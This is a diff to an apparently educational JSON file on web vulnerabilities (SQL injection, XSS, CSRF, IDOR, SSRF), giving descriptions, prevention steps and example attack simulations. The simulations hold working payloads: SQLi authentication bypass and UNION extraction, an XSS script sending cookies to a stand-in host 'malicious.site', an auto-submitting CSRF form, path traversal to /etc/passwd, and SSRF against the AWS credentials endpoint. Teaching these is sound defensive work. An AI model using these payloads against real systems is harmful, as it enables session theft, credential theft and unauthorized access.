@@ -1,14 +1,71 @@
 [
     {
         "name": "SQL Injection",
-        "description": "SQLi occurs when untrusted input is inserted into a SQL query without proper sanitization, allowing attackers to manipulate queries.",
-        "prevention": "Use prepared statements, parameterized queries, and input validation.",
-        "simulation": "Imagine a login form where you enter `' OR '1'='1` as a username. The server might run: `SELECT * FROM users WHERE username = '' OR '1'='1'`, which returns all users and bypasses authentication."
+        "description": "SQL Injection (SQLi) occurs when attackers inject malicious SQL statements into application input fields, tricking the database into executing unintended commands. This allows unauthorized data access, modification, or deletion. SQLi exploits vulnerabilities in database query construction where user input isn't properly sanitized or parameterized.",
+        "prevention": [
+            "Use parameterized queries (prepared statements) with bound parameters",
+            "Implement strict input validation using allow-lists",
+            "Apply principle of least privilege for database accounts",
+            "Utilize ORM frameworks with built-in sanitization",
+            "Enable database escaping for special characters",
+            "Deploy Web Application Firewalls (WAF) with SQLi rulesets",
+            "Conduct regular security audits using tools like SQLMap"
+        ],
+        "simulation": "In a login form vulnerable to SQLi, entering admin'-- as username and any password generates the query: SELECT * FROM users WHERE username = 'admin'--' AND password = '...'. The -- comments out the password check, granting admin access. Alternatively, ' UNION SELECT credit_card FROM payments WHERE '1'='1 could extract payment details if concatenated improperly."
     },
     {
-        "name": "Cross-Site Scripting",
-        "description": "XSS allows attackers to inject malicious scripts into web pages viewed by other users.",
-        "prevention": "Escape user input, use Content Security Policy (CSP), and validate input.",
-        "simulation": "An attacker posts `<script>alert('Hacked!')</script>` in a comment box. When another user views the page, the script runs in their browser, stealing session cookies."
+        "name": "Cross-Site Scripting (XSS)",
+        "description": "XSS occurs when attackers inject malicious client-side scripts into web pages viewed by other users. The browser executes these scripts in the victim's context, enabling session hijacking, defacement, or malware distribution. There are three primary types: Stored (persistent), Reflected (non-persistent), and DOM-based XSS.",
+        "prevention": [
+            "Context-sensitive output encoding (HTML, JavaScript, CSS, URL)",
+            "Implement Content Security Policy (CSP) with strict directives",
+            "Use HttpOnly and Secure flags for cookies",
+            "Sanitize user input with libraries like DOMPurify",
+            "Enable X-XSS-Protection headers (deprecated but defense-in-depth)",
+            "Validate Content-Type headers (prevent JSON/JS execution as HTML)",
+            "Apply automatic escaping in templating frameworks (e.g., React, Angular)"
+        ],
+        "simulation": "Attackers post <script>fetch('https://malicious.site/steal?cookie='+document.cookie)</script> in a blog comment. When authenticated users load the page, the script runs silently, exfiltrating session cookies to the attacker's server. For DOM-based XSS: https://vulnerable.site/search?term=<img src=x onerror=alert(document.domain)> executes payload without server interaction."
+    },
+    {
+        "name": "Cross-Site Request Forgery (CSRF)",
+        "description": "CSRF forces authenticated users to submit unintended requests to a vulnerable web application. Attackers craft malicious links or forms that exploit the browser's automatic cookie sending, enabling state-changing actions (e.g., fund transfers) without the user's consent. Effective when users are logged into the target site.",
+        "prevention": [
+            "Implement anti-CSRF tokens (synchronizer token pattern)",
+            "Use SameSite cookie attribute (Strict or Lax mode)",
+            "Validate Origin and Referer headers for sensitive requests",
+            "Require re-authentication for critical operations",
+            "Implement custom headers for AJAX requests (defense against cross-origin)",
+            "Use framework-specific CSRF protections (e.g., Django CSRF middleware)"
+        ],
+        "simulation": "An attacker hosts a page containing <form action='https://bank.com/transfer' method='POST'><input name='amount' value='1000'><input name='to' value='attacker'></form><script>document.forms[0].submit()</script>. If the victim visits this page while logged into their bank, $1000 is silently transferred without consent."
+    },
+    {
+        "name": "Insecure Direct Object Reference (IDOR)",
+        "description": "IDOR occurs when applications expose internal implementation objects (e.g., database keys, filenames) without proper access controls. Attackers manipulate references (e.g., URL parameters) to access unauthorized resources by predicting or enumerating identifiers.",
+        "prevention": [
+            "Implement access control checks for every direct object reference",
+            "Use indirect reference maps (pseudo-random tokens instead of DB keys)",
+            "Adopt resource-based access control (RBAC/ABAC) systems",
+            "Validate ownership for all requested resources",
+            "Avoid sequential identifiers (use UUIDs instead)",
+            "Log and monitor access patterns for anomalies",
+            "Conduct regular access control penetration tests"
+        ],
+        "simulation": "A user accesses their profile via https://app.com/profile?user_id=123. Changing the parameter to user_id=124 displays another user's private data because no ownership check exists. Similarly, https://app.com/download?file=invoice.pdf could be changed to file=../../etc/passwd if path traversal isn't prevented."
+    },
+    {
+        "name": "Server-Side Request Forgery (SSRF)",
+        "description": "SSRF tricks servers into making unauthorized requests to internal resources or external systems. Attackers exploit vulnerable URL handling features to access cloud metadata, internal networks, or restricted services. Critical in cloud environments where metadata APIs expose credentials.",
+        "prevention": [
+            "Sanitize and validate all user-supplied URLs",
+            "Deny requests to internal IP ranges and reserved domains",
+            "Use allow-list schemes (block file://, ftp://, gopher://)",
+            "Disable URL following for XML parsers",
+            "Segment internal networks with firewalls",
+            "Restrict cloud metadata API access (e.g., AWS IMDSv2)",
+            "Use network-level egress filtering"
+        ],
+        "simulation": "An application fetches user-supplied URLs for previews. Attackers submit http://169.254.169.254/latest/meta-data/iam/security-credentials/ (AWS metadata endpoint). The server retrieves and returns temporary cloud credentials, enabling full account compromise. Alternatively, file:///etc/passwd could expose system files."
     }
 ]
